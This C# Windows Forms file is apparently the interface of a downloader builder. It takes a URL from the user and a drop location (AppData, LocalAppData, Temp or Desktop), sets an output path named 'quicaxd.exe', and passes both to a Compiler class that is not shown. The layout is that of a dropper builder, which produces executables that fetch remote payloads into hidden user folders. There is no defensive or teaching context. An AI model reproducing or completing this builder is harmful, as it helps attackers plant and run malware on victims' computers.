using Downloader.Tools;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Downloader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string[] chars = { "AppData", "LocalAppData", "Temp", "Desktop"};
            foreach(string quica in chars)
            {
                guna2ComboBox1.Items.Add(quica);
            }
            guna2ComboBox1.SelectedIndex = 0;
        }

        private void download(string link, string name)
        {
            using (WebClient webClient = new WebClient())
            {
                webClient.DownloadFile(link, name);
            }
        }
        public string path;
        public string url;
        private void guna2Button1_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(guna2TextBox1.Text))
            {
                MessageBox.Show("Please enter a download URL", "quicaxd Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                if (guna2ComboBox1.SelectedIndex == 0)
                {
                    path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\quicaxd.exe";
                }
                else if(guna2ComboBox1.SelectedIndex == 1)
                {
                    path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\quicaxd.exe";
                }
                else if(guna2ComboBox1.SelectedIndex == 2)
                {
                    path = Path.GetTempPath() + "\\quicaxd.exe";
                }
                else if(guna2ComboBox1.SelectedIndex == 3)
                {
                    path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\quicaxd.exe";
                }
                url = guna2TextBox1.Text;
                Compiler compiler = new Compiler(url,path);
                compiler.Compile();
            }
        }
    }
}
